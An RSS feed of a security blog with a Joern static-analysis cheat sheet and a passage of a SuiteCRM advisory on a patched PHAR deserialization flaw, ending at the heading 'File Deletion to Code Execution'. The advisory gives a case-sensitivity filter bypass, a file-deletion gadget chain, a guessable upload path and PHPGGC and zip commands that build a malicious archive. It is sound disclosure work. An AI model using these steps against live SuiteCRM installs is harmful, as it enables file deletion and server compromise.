<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>üíª | Blog</title>
    <description>Hacking to learn, while learning to hack.
</description>
    <link>http://snoopysecurity.github.io/</link>
    <atom:link href="http://snoopysecurity.github.io/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Mon, 14 Mar 2022 00:05:51 +0000</pubDate>
    <lastBuildDate>Mon, 14 Mar 2022 00:05:51 +0000</lastBuildDate>
    <generator>Jekyll v3.2.1</generator>
    
      <item>
        <title>Joern Cheat Sheet</title>
        <description>&lt;h2 id=&quot;joern-notes&quot;&gt;Joern Notes&lt;/h2&gt;

&lt;p&gt;Joern is a static analyzer that can be used to create code property graphs and query them fairly easy. This is good alternative to CodeQL since analyzing with Joern doesn‚Äôt require you to compile/build the project. I often use this for cases where I can‚Äôt use CodeQL or Snyk‚Äôs internal static analysis engine to analyse a codebase.&lt;/p&gt;

&lt;h3 id=&quot;install-joern-linux&quot;&gt;Install Joern (Linux)&lt;/h3&gt;

&lt;p&gt;Pre-requisites&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt install source-highlight graphviz unzip
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Setup Joern CLI&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkdir joern &amp;amp;&amp;amp; cd joern # optional
curl -L &quot;https://github.com/joernio/joern/releases/latest/download/joern-install.sh&quot; -o joern-install.sh
chmod u+x joern-install.sh
./joern-install.sh --interactive
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Import a Project, create CPG and load to console&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;joern&amp;gt; importCode(&quot;crow&quot;) 
Using generator for language: NEWC: CCpgGenerator
Creating project `crow` for code at `crow`
moving cpg.bin.zip to cpg.bin because it is already a database file
Creating working copy of CPG to be safe
Loading base CPG from: /home/snoopy/joern-workshop/workspace/crow/cpg.bin.tmp
Code successfully imported. You can now query it using `cpg`.
For an overview of all imported code, type `workspace`.
Adding default overlays to base CPG
The graph has been modified. You may want to use the `save` command to persist changes to disk.  All changes will also be saved collectively on exit
res0: Cpg = io.shiftleft.codepropertygraph.generated.Cpg@29345a91
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The value ‚Äúcrow‚Äù is a folder which contains the source code we are trying to analyze.&lt;/p&gt;

&lt;p&gt;Joern also saves all analyzed projects, this can be viewed by typing &lt;code class=&quot;highlighter-rouge&quot;&gt;workspace&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;joern&amp;gt; workspace 
res1: workspacehandling.WorkspaceManager[JoernProject] = 
____________________________________________________________________________________________
| name    | overlays                           | inputPath                          | open  |
|===========================================================================================|
| NodeBB1 |                                    | /home/snoopy/joern-workshop/NodeBB | false |
| NodeBB  | controlflow,typerel,base,callgraph | /home/snoopy/joern-workshop/NodeBB | false |
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Open&lt;/code&gt; can be used to load already analyzed projects, &lt;code class=&quot;highlighter-rouge&quot;&gt;ImportCPG&lt;/code&gt; can also be used to load already created bin files&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;joern&amp;gt; open(&quot;/home/snoopy/joern-workshop/NodeBB&quot;); 
Passing paths to `loadCpg` is deprecated, please use a project name
Creating working copy of CPG to be safe
Loading base CPG from: /home/snoopy/joern-workshop/workspace/NodeBB/cpg.bin.tmp
res2: Option[workspacehandling.Project] = Some(
  value = Project(
    projectFile = ProjectFile(inputPath = &quot;/home/snoopy/joern-workshop/NodeBB&quot;, name = &quot;NodeBB&quot;),
    path = /home/snoopy/joern-workshop/workspace/NodeBB,
    cpg = Some(value = io.shiftleft.codepropertygraph.generated.Cpg@762e3836)
  )
)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;joern&amp;gt; open(&quot;NodeBB9&quot;) 
Creating working copy of CPG to be safe
Loading base CPG from: /home/snoopy/joern-workshop/workspace/NodeBB/cpg.bin.tmp
res1: Option[workspacehandling.Project] = Some(
  value = Project(
    projectFile = ProjectFile(
      inputPath = &quot;/home/snoopy/joern-workshop/NodeBB&quot;,
      name = &quot;NodeBB&quot;
    ),
    path = /home/snoopy/joern-workshop/workspace/NodeBB,
    cpg = Some(value = io.shiftleft.codepropertygraph.generated.Cpg@1c65740a)
  )
)

joern&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;basic-search&quot;&gt;Basic Search&lt;/h3&gt;

&lt;p&gt;Searching&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;// search for any methods that has the sanitize in its name. Regex can be used here
joern&amp;gt; cpg.method.name(&quot;.*sanitize.*&quot;).name.l 
res4: List[String] = List(&quot;sanitizeSignature&quot;, &quot;sanitize&quot;)

// dump the code block that matched the search
joern&amp;gt; cpg.method.name(&quot;.*find.*&quot;).dump 
res3: List[String] = List(
  &quot;&quot;&quot;static Map* find_hash( ino_t ino, dev_t dev, off_t size, time_t ct ); /* &amp;lt;=== */ 
&quot;&quot;&quot;,
  &quot;&quot;&quot;static Map* /* &amp;lt;=== */ 
find_hash( ino_t ino, dev_t dev, off_t size, time_t ct )
    {
    unsigned int h, he, i;
    Map* m;

    h = hash( ino, dev, size, ct );
    he = ( h + hash_size - 1 ) &amp;amp; hash_mask;
    for ( i = h; ; i = ( i + 1 ) &amp;amp; hash_mask )
	{
	m = hash_table[i];
	if ( m == (Map*) 0 )
	    break;
	if ( m-&amp;gt;hash == h &amp;amp;&amp;amp; m-&amp;gt;ino == ino &amp;amp;&amp;amp; m-&amp;gt;dev == dev &amp;amp;&amp;amp;
	     m-&amp;gt;size == size &amp;amp;&amp;amp; m-&amp;gt;ct == ct )
	    return m;
	if ( i == he )
	    break;
	}
    return (Map*) 0;
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;other-useful-commands&quot;&gt;Other useful commands&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.method.name(&quot;parse_public_key_packet&quot;).local.name.l&lt;/code&gt; - Find all local variables defined in a method&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.method.name(&quot;parse_public_key_packet&quot;).location.map( x=&amp;gt; (x.lineNumber.get,x.filename)).l&lt;/code&gt; - Find which file and line number they are in&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.method.name(&quot;parse_public_key_packet&quot;).local.typ.name.l.head&lt;/code&gt; - Find the type of the first local variable defined in a method&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.method.name(&quot;parse_public_key_packet&quot;).callOut.name.l&lt;/code&gt; - Find all outgoing calls (call-sites) in a method&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.method.name(&quot;parse_public_key_packet&quot;).caller.name.l&lt;/code&gt; - Find which method calls a method&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.types.name(&quot;vlc_.*&quot;).localsOfType.name.l&lt;/code&gt; - List all local variables of type &lt;code class=&quot;highlighter-rouge&quot;&gt;vlc_.*&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.types.name(&quot;vlc_log_t&quot;).map( x=&amp;gt; (x.name, x.start.member.name.l)).l&lt;/code&gt; - Find member variables of a struct&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.local.filter(_.typ.name(&quot;vlc_log_t&quot;)).name.l&lt;/code&gt; - Find local variables and filter them by their type&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.local.filter(_.typ.name(&quot;vlc_log_t&quot;)).method.dump&lt;/code&gt; - Which method are they used in?&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.local.filter(_.typ.name(&quot;vlc_log_t&quot;)).method.file.name.l&lt;/code&gt; - Get the filenames where these methods are&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.method.where(_.parameter.size &amp;gt; 4).signature.l&lt;/code&gt; - Identify functions with more than 4 parameters&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.method.where(_.controlStructure.size &amp;gt; 4).name.l&lt;/code&gt; - Identify functions with &amp;gt; 4 control structures (cyclomatic complexity)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.method.where(_.numberOfLines &amp;gt;= 500).name.l&lt;/code&gt; - Identify functions with more than 500 lines of code&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.method.where(_.ast.isReturn.l.size &amp;gt; 1).name.l&lt;/code&gt; - Identify functions with multiple return statements&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.method.where(_.ast.isControlStructure.parserTypeName(&quot;(For|Do|While).*&quot;).size &amp;gt;4).name.l&lt;/code&gt; - Identify functions with more than 4 loops&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.method.where(_.depth(_.isControlStructure) &amp;gt; 3).name.l&lt;/code&gt; - Identify functions with nesting depth larger than 3&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.method.name(&quot;find_hash&quot;).repeat(_.caller)(_.emit).name.l&lt;/code&gt; - Find the calle of a method&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.method.external.name.l.distinct.sorted&lt;/code&gt; - All names of external methods used by the program&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.call(&quot;str.*&quot;).code.l&lt;/code&gt; - All calls to functions that start with ‚Äústr*‚Äù&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.call(&quot;strcpy&quot;).method.name.l&lt;/code&gt; - All methods that call strcpy&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.call(&quot;sprintf&quot;).argument(2).filterNot(_.isLiteral).code.l&lt;/code&gt; Looking into parameters: second argument to sprintf is NOT a literal&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.call(&quot;sprintf&quot;).argument(2).filterNot(_.isLiteral).dump&lt;/code&gt; - Quickly see this method above&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;cpg.method.name(&quot;parse_public_key_packet&quot;).dot |&amp;gt; &quot;/tmp/foo.dot&quot;&lt;/code&gt; -  Dump dot representations of ASTs for all methods that match &lt;code class=&quot;highlighter-rouge&quot;&gt;parse&lt;/code&gt; into file
    &lt;h3 id=&quot;exporting-graphs&quot;&gt;Exporting Graphs&lt;/h3&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Joern can create the following graph representations for C/C++ code:&lt;/p&gt;

&lt;p&gt;*Abstract Syntax Trees (AST)&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Control Flow Graphs (CFG)&lt;/li&gt;
  &lt;li&gt;Control Dependence Graphs (CDG)&lt;/li&gt;
  &lt;li&gt;Data Dependence Graphs (DDG)&lt;/li&gt;
  &lt;li&gt;Program Dependence graphs (PDG)&lt;/li&gt;
  &lt;li&gt;Code Property Graphs (CPG14)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Example of a method name ast&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;joern&amp;gt; cpg.method.name(&quot;finish_connection&quot;).plotDotAst 
plotDotAst    plotDotCdg    plotDotCfg    plotDotCpg14  plotDotDdg    plotDotPdg

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/joern/1.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;/assets/joern/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Joern supports many analysis types. Some of these are run by default. These can be ran with &lt;code class=&quot;highlighter-rouge&quot;&gt;run name&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;joern&amp;gt; run 
res1: OverlaysDynamic = 
__________________________________________________________________________
| name          | description                                             |
|=========================================================================|
| callgraph     | Call graph layer                                        |
| controlflow   | Control flow layer (including dominators and CDG edges) |
| base          | base layer (linked frontend CPG)                        |
| typerelations | Type relations layer (hierarchy and aliases)            |
| dumpast       | Dump abstract syntax trees to out/                      |
| dumpcfg       | Dump control flow graph to out/                         |
| dumpcdg       | Dump control dependence graph to out/                   |
| dumppdg       | Dump program dependence graph to out/                   |
| scan          | Joern Code Scanner                                      |
| dumpddg       | Dump data dependence graphs to out/                     |
| commit        | Apply current custom diffgraph                          |
| ossdataflow   | Layer to support the OSS lightweight data flow tracker  |
| dumpcpg14     | Dump Code Property Graph (2014) to out/                 |
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Run Dataflow analysis&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;joern&amp;gt; run ossdataflow 
The graph has been modified. You may want to use the `save` command to persist changes to disk.  All changes will also be saved collectively on exit
res2: Cpg = io.shiftleft.codepropertygraph.generated.Cpg@34e4a136

joern&amp;gt; save 
Saving graphs on disk. This may take a while.
Turning working copy into new persistent CPG
Creating working copy of CPG to be safe
Loading base CPG from: /home/snoopy/joern-workshop/workspace/alloc_party/cpg.bin.tmp
res3: List[workspacehandling.Project] = List(
  Project(
    projectFile = ProjectFile(
      inputPath = &quot;/home/snoopy/joern-workshop/alloc_party&quot;,
      name = &quot;alloc_party&quot;
    ),
    path = /home/snoopy/joern-workshop/workspace/alloc_party,
    cpg = Some(value = io.shiftleft.codepropertygraph.generated.Cpg@4a65ce06)
  )
)

joern&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Define a source method&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;joern&amp;gt; def source = cpg.method.name(&quot;.*alloc.*&quot;).parameter 
defined function source
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Define a sink method&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;joern&amp;gt; def sink = cpg.call(&quot;malloc&quot;).where(_.argument(1).isCallTo(Operators.multiplication)).argument 
defined function sink
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Code example&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;void *alloc_havoc(int y) { //source
  int z = 10;
  void *x = malloc(y * z); //sink
  return x;
}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;joern&amp;gt;  sink.reachableByFlows(source).p 
res11: List[String] = List(
  &quot;&quot;&quot;_______________________________________________________________________________________________________
| tracked            | lineNumber| method      | file                                                  |
|======================================================================================================|
| alloc_havoc(int y) | 11        | alloc_havoc | /home/snoopy/joern-workshop/alloc_party/alloc_party.c |
| y * z              | 13        | alloc_havoc | /home/snoopy/joern-workshop/alloc_party/alloc_party.c |
| y * z              | 13        | alloc_havoc | /home/snoopy/joern-workshop/alloc_party/alloc_party.c |
&quot;&quot;&quot;
)

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Joern can also be run as a script using the Joern CLI. More about this can be found here: https://docs.joern.io/interpreter. This feature can be useful for mass scanning codebases. The server mode is also useful if you want to build tooling around it https://docs.joern.io/server&lt;/p&gt;

&lt;h3 id=&quot;joern-scanning&quot;&gt;Joern Scanning&lt;/h3&gt;

&lt;p&gt;Joern-Scan has a built in scanner which uses community provided queries from &lt;a href=&quot;https://queries.joern.io/&quot;&gt;https://queries.joern.io/&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;joern-scan ‚Äìlist-languages
Writing logs to: /tmp/joern-scan-log.txt
Available languages (case insensitive):&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;golang&lt;/li&gt;
  &lt;li&gt;fuzzy_test_lang&lt;/li&gt;
  &lt;li&gt;csharp&lt;/li&gt;
  &lt;li&gt;java&lt;/li&gt;
  &lt;li&gt;php&lt;/li&gt;
  &lt;li&gt;c&lt;/li&gt;
  &lt;li&gt;kotlin&lt;/li&gt;
  &lt;li&gt;ghidra&lt;/li&gt;
  &lt;li&gt;javascript&lt;/li&gt;
  &lt;li&gt;python&lt;/li&gt;
  &lt;li&gt;llvm&lt;/li&gt;
  &lt;li&gt;newc&lt;/li&gt;
  &lt;li&gt;javasrc
```&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;To scan a folder run &lt;code class=&quot;highlighter-rouge&quot;&gt;joern-scan /project_to_scan&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Other commands:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;joern-scan --updatedb&lt;/code&gt; - Updates built-in query database.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;joern-scan /file/to/scan --overwrite&lt;/code&gt; - Overwrite existing project CPG, run after application changes.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;joern-scan /file/to/scan --tags xss,defaul&lt;/code&gt; - Specify queries to run.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Instead of using the Joern interpreter, another option is to add your custom query in the correct format, build this querydb locally and use it with joern scan.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git clone https://github.com/joernio/query-database/
$ cd query-database
add your query
$ ./install.sh
$ ./joern-scan /file/to/scan
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;references&quot;&gt;References&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;https://docs.joern.io/&lt;/li&gt;
  &lt;li&gt;https://github.com/joernio/workshops&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Wed, 08 Dec 2021 09:00:00 +0000</pubDate>
        <link>http://snoopysecurity.github.io/software-security/2021/12/08/joern-cheat-sheet.html</link>
        <guid isPermaLink="true">http://snoopysecurity.github.io/software-security/2021/12/08/joern-cheat-sheet.html</guid>
        
        
        <category>software-security</category>
        
      </item>
    
      <item>
        <title>SuiteCRM - Phar Deserialization to Code Execution</title>
        <description>&lt;p&gt;This is a copy of a blog which i recently published on Snyk: &lt;a href=&quot;https://snyk.io/blog/suitecrm-phar-deserialization-vulnerability-to-code-execution/&quot;&gt;https://snyk.io/blog/suitecrm-phar-deserialization-vulnerability-to-code-execution/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;

&lt;p&gt;SuiteCRM is a free and open source Customer Relationship Management application for servers. This advisory details a PHAR deserialization vulnerability that exists in SuiteCRM which could be leveraged by an authenticated administrator to execute commands on the underlying operating system. This issue has been &lt;a href=&quot;https://docs.suitecrm.com/admin/releases/7.11.x/#_7_11_19&quot;&gt;fixed in release 7.11.19&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;In PHP, PHAR (PHP Archive) files can be used to package PHP applications and PHP libraries into one archive file. The PHAR format in PHP uses a single file format which can be used to store and execute multiple PHP code. PHAR files contain metadata about the files in the archive. In a PHAR file, this metadata is stored in a serialized format.&lt;/p&gt;

&lt;p&gt;If a file operation is performed on a PHAR file via the &lt;code class=&quot;highlighter-rouge&quot;&gt;phar://&lt;/code&gt; wrapper, the PHAR file‚Äôs metadata would be unserialized. As such, an attacker could perform PHP object injection without the use of the &lt;code class=&quot;highlighter-rouge&quot;&gt;unserialize()&lt;/code&gt; function by uploading a PHAR file. This vulnerability notably gained popularity after Sam Thomas published his research work at BlackHat USA 2018 titled, &lt;a href=&quot;https://www.blackhat.com/us-18/briefings/schedule/index.html#its-a-php-unserialization-vulnerability-jim-but-not-as-we-know-it-11078&quot;&gt;It‚Äôs a PHP Unserialization Vulnerability Jim, but Not as We Know It&lt;/a&gt;, which affected multiple Content Management Systems. In order to exploit this vulnerability, two conditions must be met:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;A PHP filesystem function such as ‚Äúfile_exists‚Äù that can be controlled which will trigger the unserialize() function&lt;/li&gt;
  &lt;li&gt;The ability to upload a PHAR file with the .phar, .zip, or .jpeg extension to the target system and the path of this file to be known&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;technical-details&quot;&gt;Technical Details&lt;/h3&gt;

&lt;p&gt;1) Root Cause&lt;/p&gt;

&lt;p&gt;This vulnerability bypasses the security mechanisms implemented by SuiteCRM maintainers as part of their remediation to &lt;a href=&quot;https://packetstormsecurity.com/files/156324/SuiteCRM-7.11.11-Phar-Deserialization.html&quot;&gt;CVE-2020-8801&lt;/a&gt;. As seen in the advisory for CVE-2020-8801, multiple areas within the SuiteCRM administrator panel which includes Backups, Import, and UpgradeWizard areas can be used to trigger PHAR deserialization. This was remediated by the maintainers within release 7.11.13 with commit &lt;a href=&quot;https://github.com/salesagility/SuiteCRM/commit/571cbfa209da4c8280a5359f301115de25b4c6e3&quot;&gt;571cbfa209da4c8280a5359f301115de25b4c6e3&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/suitecrm/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The strpos function is used to check if a user parameter contains an occurrence of the phar:// URI. However, due to the usage of the strpos function, this check is case-sensitive. As such, it is possible to bypass this check using capital characters and trigger PHAR deserialization by calling the phar wrapper such as  PHAR://.&lt;/p&gt;

&lt;p&gt;2) Finding a usable Gadget&lt;/p&gt;

&lt;p&gt;While it is possible to bypass the SuiteCRM patch for the PHAR URI check, it was found that SuiteCRM maintainers took precautions to ensure that all possible POP gadgets that could be triggered by an attacker using deserialization cannot be used. This was done by adding a __wakeup magic method into classes that were considered to be dangerous. This method is automatically invoked every time an object is being unserialized and ensures that all of the object‚Äôs properties are destroyed upon deserialization. An example of this can be seen below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/suitecrm/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Within modules/Import/sources/ImportFile.php, a __destruct magic method exists which could be abused to delete arbitrary files from a system through unsafe deserialization. However, due to the presence of the above __wakeup method, this __destruct method cannot be leveraged by an attacker. This check was found throughout SuiteCRM‚Äôs codebase.&lt;/p&gt;

&lt;p&gt;However, a closer look at SuiteCRM‚Äôs dependencies, it was possible to find a usable __destruct method that could be leveraged for arbitrary file deletion. SuiteCRM uses the zend-gdata library which uses zf1/zend-http as a transitive dependency.&lt;/p&gt;

&lt;p&gt;Within the Stream.php file of the zf1/zend-http package, a __destruct method exists which when triggered, will run the @unlink function on the $stream_name property of an object. The @unlink function within this method can be leveraged to delete a file. In order for this function to be triggered, a $_cleanup property should also exist for a given object. The code for this __destruct method can be seen below.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/suitecrm/3.png&quot; alt=&quot;&quot; /&gt;
&lt;a href=&quot;https://github.com/zf1/zend-http/blob/de1e836ea1bc7d5acccc82b1cf4dd236271a21cb/library/Zend/Http/Response/Stream.php#L224-L233&quot;&gt;https://github.com/zf1/zend-http/blob/de1e836ea1bc7d5acccc82b1cf4dd236271a21cb/library/Zend/Http/Response/Stream.php#L224-L233&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The existence of this gadget is already known and is available for use within the PHPGGC library. &lt;a href=&quot;https://github.com/ambionics/phpggc&quot;&gt;PHPGGC&lt;/a&gt; is a library of unserialize() payloads along with a script to generate a POP gadget payload based on user given parameters.&lt;/p&gt;

&lt;p&gt;Note: If all dev dependencies are also installed within a SuiteCRM installation, a vulnerable release of PHP-CS-Fixer can also be leveraged for Arbitrary FIle Deletion instead of zf1/zend-http. The pull request which integrates this POP gadget to the PHPGGC can be seen here: &lt;a href=&quot;https://github.com/ambionics/phpggc/pull/93&quot;&gt;https://github.com/ambionics/phpggc/pull/93&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3) Finding and Abusing an Upload Functionality&lt;/p&gt;

&lt;p&gt;While the advisory for &lt;a href=&quot;https://packetstormsecurity.com/files/156324/SuiteCRM-7.11.11-Phar-Deserialization.html&quot;&gt;CVE-2020-8801&lt;/a&gt; explains the parameters and the areas within SuiteCRM that can be used for PHAR deserialization, the advisory and the related blog from the researcher who discovered this issue doesn‚Äôt state where a PHAR file can be uploaded or what path/location could be leveraged. Furthermore, it was found that any file that is uploaded to SuiteCRM would be renamed to have no extension and the name of this file would be changed to a random UUID identifier. For example, party-parrot.png uploaded as part of a document will be renamed to 51eea769-ce13-40bb-fb25-60197bf855ae.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/suitecrm/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, after some further walkthrough of all SuiteCRM functionality, it was found that any Module Loader zip uploads do not adhere to this behaviour and module zip uploads are uploaded and saved at an arbitrary location with the .zip extension that can be guessed by an attacker. This can be used to fulfill the requirements of a PHAR deserialization vulnerability. An example of this can be seen below:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/suitecrm/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The uploaded examplemodule.zip file will be stored within the following location. The manifest.php file itself is taken from the module.zip directory and it is also available in the same location.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/suitecrm/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;4) Triggering Arbitrary File Deletion&lt;/p&gt;

&lt;p&gt;With the path of an uploaded zip file now known, a file deletion gadget being present, and functions that trigger Phar deserialization being available, it is possible to leverage these conditions to exploit a SuiteCRM installation.&lt;/p&gt;

&lt;p&gt;Using &lt;a href=&quot;https://github.com/ambionics/phpggc&quot;&gt;PHPGGC&lt;/a&gt;, an example phar file can be created as follows:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./phpggc -p zip -o /tmp/malicious.zip -f ZendFramework/FD1 /tmp/test.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The above command will create a phar file with ZIP format and call it malicious.zip. This will insert a serialized payload of the previously mentioned zf1/zend-http POP gadget and set the $stream_name property of this serialized object to be /tmp/test.txt. Furthermore, the -f option within PHPGGC can also be used to ensure that the serialized object will be destroyed right after the unserialize() call, making the payload more reliable.&lt;/p&gt;

&lt;p&gt;Note: In order for this zip file to be accepted by the application, an example manifest.php file should also be added to the zip. This can be done as follows within Linux:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zip -rv malicious.zip manifest.php
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Once uploaded, this file will now be located in the upload/upgrades/module directory.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/suitecrm/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This file can now be triggered through the Backups section within the SuiteCRM admin panel.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/suitecrm/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;5) File Deletion to Code Execution&lt;/p&gt;

